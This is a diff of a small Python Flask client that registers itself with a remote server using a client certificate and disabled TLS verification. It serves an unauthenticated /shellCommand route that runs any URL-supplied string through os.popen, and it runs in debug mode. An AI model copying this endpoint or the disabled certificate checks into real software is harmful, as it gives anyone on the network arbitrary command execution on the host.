@@ -1,6 +1,6 @@
 from flask import Flask
 from os import popen
-from requests import Session
+from requests import Session, post
 from adaptor import ForcedIPHTTPSAdapter
 from json import loads
 
@@ -39,22 +39,24 @@ def hello():
 def getKernelInfo():
     return popen('uname -a').read()
 
-@app.route('/shellCommand/<command>')
+@app.route('/shellCommand/<path:command>')
 def executeShellCommand(command: str):
     return popen(command).read()
 
 
 if __name__ == "__main__":
-    session = Session()
-    session.mount(server_addr[0] + server_api['register']['url'], ForcedIPHTTPSAdapter(dest_ip=server_addr[3]))
-    response = session.post(server_addr[1] + server_api['register']['url'],
-                            headers={'Host': server_addr[2]},
-                            data={'addr': '127.0.0.1:5000'},
-                            files=[('client_cert', ('cert.pem', open(local_cert[0], 'rb'), 'text/plain')), ],
-                            verify=False)
+    # session = Session()
+    # session.mount(server_addr[0] + server_api['register']['url'], ForcedIPHTTPSAdapter(dest_ip=server_addr[3]))
+    response = post(server_addr[1] + server_api['register']['url'],
+                    headers={'Host': server_addr[2]},
+                    data={'addr': '127.0.0.1:5000'},
+                    files=[('client_cert', ('cert.pem', open(local_cert[0], 'rb'), 'text/plain')), ],
+                    verify=False)
     if response.status_code == 200:
         client_id = loads(response.text)['id']
-    print(client_id)
+        print(client_id)
 
     # app.run(ssl_context='adhoc')
     app.run(ssl_context=local_cert, debug=True)
+
+
